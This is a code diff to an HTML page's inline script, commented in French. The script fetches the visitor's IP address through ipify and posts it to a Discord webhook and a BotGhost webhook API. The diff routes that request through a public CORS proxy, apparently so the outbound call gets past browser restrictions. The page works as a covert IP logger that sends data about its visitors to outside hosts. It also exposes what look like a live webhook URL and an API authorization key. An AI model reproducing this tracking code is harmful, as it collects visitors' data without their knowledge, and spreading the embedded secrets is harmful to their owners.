@@ -50,8 +50,9 @@
     </div>
 
     <script>
-        const webhookURL = "https://discord.com/api/webhooks/1305558117420892241/X3TC44x8aZrxgYD71reZpHIZThzShBhBRhiet7w6K6Uq7oQya9xcGPaPdm3KIC4AZh2K";  // Remplacez par votre webhook Discord
-        const apiUrl = "https://api.botghost.com/webhook/1151241118403534958/0t2nh2769i3bdja5axve7b";  // Remplacez par votre URL API
+        const webhookURL = "https://discord.com/api/webhooks/1305558117420892241/X3TC44x8aZrxgYD71reZpHIZThzShBhBRhiet7w6K6Uq7oQya9xcGPaPdm3KIC4AZh2K";
+        const proxy = "https://cors-anywhere.herokuapp.com/";
+        const apiUrl = "https://api.botghost.com/webhook/1151241118403534958/0t2nh2769i3bdja5axve7b";
 
         function checkIP() {
             // Récupère l'IP de l'utilisateur via l'API ipify
@@ -92,7 +93,7 @@
                         ]
                     };
 
-                    fetch(apiUrl, {
+                    fetch(proxy + apiUrl, {
                         method: "POST",
                         headers: {
                             "Authorization": "bd8f5e61c5b98e12773f211488437e25f753c9139c32103c0bcce6f2bf9223f9",  // Remplacez par votre API_KEY
